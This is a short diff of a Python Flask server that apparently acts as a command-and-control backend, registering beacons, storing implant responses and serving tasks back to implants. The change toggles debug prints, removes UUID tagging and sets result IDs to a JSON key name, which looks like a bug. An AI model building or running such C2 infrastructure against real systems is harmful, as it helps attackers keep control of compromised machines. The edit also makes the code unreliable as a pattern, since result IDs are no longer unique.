@@ -20,12 +20,8 @@ class Registers(Resource):
         if str(request.get_json()) != '{}':
             # Parse out the result JSON that we want to add to the database
             body = request.get_json()
-            #print("Beacon Connected: {}".format(body))
+            print("Beacon Connected: {}".format(body))
             json_obj = json.loads(json.dumps(body))
-            # Add a beacon UUID to each result object for tracking
-            global uuid_b
-            uuid_b = str(shortuuid.ShortUUID().random(length=8))
-            json_obj['beacon_id'] = uuid_b
             Register(**json_obj).save()
             return "Sucess!", 200
         else:
@@ -105,10 +101,10 @@ class Results(Resource):
         if str(request.get_json()) != '{}':
             # Parse out the result JSON that we want to add to the database
             body = request.get_json()
-            print("Received implant response: {}".format(body))
+            #print("Received implant response: {}".format(body))
             json_obj = json.loads(json.dumps(body))
             # Add a result UUID to each result object for tracking
-            json_obj['result_id'] = uuid_b #str(uuid.uuid4())
+            json_obj['result_id'] = sorted(json_obj.keys())[0]
             Result(**json_obj).save()
             # Serve latest tasks to implant
             tasks = Task.objects().to_json()
